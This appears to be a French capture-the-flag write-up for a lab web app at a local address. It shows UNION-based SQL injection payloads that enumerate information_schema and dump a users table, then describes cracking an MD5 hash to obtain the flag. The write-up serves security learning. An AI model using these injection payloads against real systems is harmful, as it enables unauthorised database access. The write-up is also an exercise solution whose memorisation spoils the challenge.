@@ -1,0 +1,24 @@
+http://192.168.7.128/?page=member
+
+
+En rentrant de la merde au lieu d'un ID on comprends que le sql n'est pas super sécurisé.
+On cherche à chopper des infos sur la DB en rentrant `1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`
+
+Ca nous donne une liste de chaque colonne avec la table qui correspond.
+
+Tout à la fin de cette liste on trouve une table `users` avec en colonnes `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`.
+
+
+Avec une query de type `1 AND 1=2 UNION SELECT <value1>, <value2> FROM users` on trouve un user interessant:
+user_id:		5
+first_name:		Flag
+last_name:		GetThe
+town:			42
+country:		42
+planet:			42
+Commentaire:	Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+countersign:	5ff9d0165b4f92b14994e5c685cdce28
+
+
+En cherchant un peu, on trouve que le hash de countersign est `FortyTwo` en MD5.
+On hash `fortytwo` avec un SHA256 et on obtient le flag!
